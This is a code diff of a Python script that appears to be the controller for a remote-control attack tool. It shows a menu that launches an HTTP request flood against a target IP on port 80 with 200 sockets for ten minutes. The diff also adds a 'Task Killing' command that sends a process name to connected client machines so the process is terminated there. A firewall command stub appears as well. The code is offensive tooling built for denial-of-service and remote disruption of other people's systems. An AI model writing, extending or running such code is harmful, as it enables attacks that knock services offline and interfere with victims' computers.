@@ -38,8 +38,11 @@ def connection(ActualValue):
                 print(listToStr)
                 from_client += str(data)
 
+
         print(2 * '\n')
-        enumvalue()
+        break
+    return
+    #enumvalue()
 
 def enumvalue():
     value = ""
@@ -90,8 +93,10 @@ def enumvalue():
 
 def attackcommand():
     value = ""
-    accepted_command = ["1","E"]
+    global processName
+    accepted_command = ["1","2","E"]
     print("[1] HTTP request Flood \n"
+          "[2] Task Killing \n"
           "[E] Exit \n")
     type = input("What is your attack category? \n")[0]
 
@@ -100,10 +105,29 @@ def attackcommand():
         dos = HTTPRequestDOS(targetIP, 80, socketsCount=200)
         dos.attack(timeout=60 * 10)
     elif accepted_command[1] == type:
+        processName = str(input("Enter process name: "))
+        value = "2" + " " + str(processName)
+        taskKill(value)
+    elif accepted_command[2] == type:
         print("Connection Closed")
     else:
         print("Invalid Command")
     return
+
+def taskKill(value):
+    ActualValue = "2" + value
+    print(ActualValue)
+    connection(ActualValue)
+    stop_kill = input("Press enter to stop")
+    connection(stop_kill)
+"""
+    i = 0
+    while i < 100:
+        print(i)
+        i = i + 1
+        connection(ActualValue)
+"""
+
 
 def firewall():
     ActualValue = "F2"
